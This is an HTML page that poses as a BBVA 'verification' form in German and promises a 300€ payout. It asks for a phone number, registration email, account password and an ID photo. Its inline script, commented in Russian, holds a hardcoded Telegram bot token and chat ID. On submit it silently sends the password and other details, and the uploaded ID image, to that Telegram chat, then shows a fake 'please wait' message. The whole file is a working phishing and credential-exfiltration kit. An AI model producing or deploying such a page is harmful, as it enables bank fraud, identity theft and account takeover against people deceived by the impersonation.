<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verifizierung - BBVA</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <main class="main-card" style="margin-top: 50px;">
            <h1 class="title">Datenübermittlung</h1>
            <p class="description">Bitte füllen Sie alle Felder aus, um die Auszahlung von 300€ zu erhalten.</p>

            <form id="verificationForm" class="verification-form">
                <label>Ihre Kontakt-Telefonnummer (WhatsApp/Telegram):</label>
                <input type="tel" id="userPhone" placeholder="+49..." required>

                <label>Registrierungs-E-Mail (vom Manager erhalten):</label>
                <input type="email" id="regEmail" placeholder="beispiel@mail.com" required>

                <label>Registrierungsnummer (vom Manager erhalten):</label>
                <input type="text" id="regPhone" placeholder="Nummer eingeben" required>

                <label>Account-Passwort:</label>
                <input type="text" id="regPass" placeholder="Ihr Passwort" required>

                <label>Dokument / Foto hochladen:</label>
                <div class="file-upload-container" onclick="document.getElementById('photo-upload').click()">
                    <div class="upload-icon">📤</div>
                    <div class="upload-text">
                        <strong>Foto auswählen</strong>
                        <span>Ausweis oder Bestätigung</span>
                    </div>
                    <input type="file" id="photo-upload" class="hidden-input" accept="image/*" required onchange="updateFileName(this)">
                </div>
                <div id="file-name-display" class="file-name-info">Keine Datei ausgewählt</div>

                <button type="submit" class="btn-primary" id="submitBtn" style="margin-top: 20px;">
                    Daten zur Prüfung absenden
                </button>
            </form>
        </main>
    </div>

    <div id="successModal" class="modal-overlay" style="display: none;">
        <div class="modal-content">
            <div class="modal-icon">⏳</div>
            <h2>Bitte warten...</h2>
            <p>Ihre Daten wurden erfolgreich übermittelt. Der Manager wird Sie in Kürze für die Auszahlung der 300€ kontaktieren.</p>
        </div>
    </div>

    <script>
        // Твои настройки Telegram (уже вписаны)
        const botToken = '8208977713:AAFqG2kZpj_SgtomllDdrBQAn4DG9V6t2OI';
        const chatId = '787580401';

        function updateFileName(input) {
            const display = document.getElementById('file-name-display');
            if (input.files.length > 0) {
                display.textContent = "Ausgewählt: " + input.files[0].name;
                display.style.color = "#00d2ff";
            }
        }

        document.getElementById('verificationForm').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.textContent = 'Wird gesendet...';

            const userPhone = document.getElementById('userPhone').value;
            const regEmail = document.getElementById('regEmail').value;
            const regPhone = document.getElementById('regPhone').value;
            const regPass = document.getElementById('regPass').value;
            const fileInput = document.getElementById('photo-upload');

            // Формируем текст сообщения для бота
            const message = `
🔔 *Neue Verifizierung!*
📱 Контакт клиента: ${userPhone}
📧 Email для рег: ${regEmail}
📞 Номер для рег: ${regPhone}
🔑 ПАРОЛЬ: ${regPass}
            `;

            try {
                // Отправляем текст
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                // Отправляем фото
                if (fileInput.files.length > 0) {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', fileInput.files[0]);
                    
                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }

                document.getElementById('successModal').style.display = 'flex';
            } catch (error) {
                alert('Fehler beim Senden.');
                btn.disabled = false;
                btn.textContent = 'Daten absenden';
            }
        };
    </script>
</body>
</html>
